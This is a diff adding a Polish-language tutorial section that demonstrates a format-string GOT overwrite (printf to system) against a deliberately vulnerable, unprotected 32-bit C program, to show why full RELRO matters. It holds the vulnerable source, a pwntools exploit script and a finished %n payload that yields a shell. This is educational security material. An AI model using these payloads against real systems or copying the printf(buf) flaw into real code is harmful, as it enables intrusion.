@@ -17,3 +17,112 @@ Znacząco wpływa to na czas startu aplikacji, bo linker musi na samym jej starc
 W gcc kompiluje się z full RERLO flaga `-z,relro,now`.
 
 ### 1.2 Proof of Concept - got overwrite with format string
+
+
+Kod podatnej aplikacji:
+
+```c
+// gcc vuln.c -std=c99 -m32 -fno-stack-protector -no-pie -w -o vuln.o
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+
+int main()
+{
+    char buf[100];
+    printf("Hello \n");
+    scanf("%s",buf);
+    while(strcmp(buf,"exit")) {
+        printf("\n");
+        printf(buf);
+        scanf("%s",buf);
+    }
+
+    return 0;
+
+}
+```
+
+Strategią tego ataku jest podmiana adresu funkcji `printf` na adres funkcji `system` w tablicy GOT.
+
+Aby tego dokonać użyje exploitu typu `format string` ,który korzysta z tagów formatujących funkcji `printf`.
+```c
+ printf(buf);
+```
+
+Ta linijka jest naszym wejściem do programu.
+
+W przypadku podania tagów `%x` pobierana jest wartość ze stosu.
+
+![img.png](img/img.png)
+
+Chcę ustalić jak daleko na stosie jest `buf` Metodą prób i błędów znajduję początek bufora. Aby pobrać inny argument niż najwyższy używam konstrukcji %3$x.
+
+![img_1.png](img/img_1.png)
+
+Bufor znajduję się na 7 pozycji.
+
+Teraz potrzeba mi adresu wpisu GOT `printf` oraz adresu `system` w `libc`.
+
+![img_2.png](img/img_2.png)
+
+![img_3.png](img/img_3.png)
+
+Teraz moim zadaniem jest skopiować adres system pod adres `0x0804c010`.
+
+Dokonam tego tagiem `%n`. Zapisuje on ilość bajtów wyswietlonych pod adres wskazany przez pointer.
+
+Zaczynam pisać exploit.
+
+```python
+from pwn import *
+
+p = process("./vuln.o")
+
+p.readuntil("Hello")
+
+gdb.attach(p)
+
+#0804c010 -prinft@got
+
+name = '%15$x%16$x'.ljust(32,'A')
+name += '\x10\xc0\x04\x08'
+name += '\x12\xc0\x04\x08'
+
+p.sendline(name)
+
+p.interactive()
+```
+
+Używam paddingu, aby pozycje na stosie były niezmienne. Według moich obliczeń adresy wpisane przez mnie znajdują się na 15 i 16 pozycji stosu.
+
+![img_4.png](img/img_4.png)
+
+Jest to prawda.
+
+Pod adres `0x0804c010` chce zapisać `0f10` czyli `3856` bajty. Osiągam to whitespace'ami generowanym przez tag x.
+
+Pod adres `0x0804c012` chce zapisać wyższą cześć adresu systemu czyli `f7e1` co daje `63457` bajty, ale poprzednie bajty już są na ekranie, więc `63457 - 3856 = 59601` bajtów.
+
+Sklejam gotowy exploit.
+
+
+```python
+name = '%3856p%15$n%59601p%16$n'.ljust(32,'A')
+name += '\x10\xc0\x04\x08'
+name += '\x12\xc0\x04\x08'
+```
+
+Teraz powinniśmy otrzymać pseudo shella, ale po wpisaniu `sh` system spawnuje pełnoprawnego shella.
+
+![img_5.png](img/img_5.png)
+
+Udało się.
+
+Exploit odpalany z włączonym relro nie daje żadnego skutku - adres got znajduję się w innym miejscu. W przypadku próby nadpisania tego miejsca następuję `SIGSEGV` - chcieliśmy nadpisać sekcje read-only. Kod tego exploitu znajduję się w `exploit1.py`.
+
+![img_6.png](img/img_6.png)
+
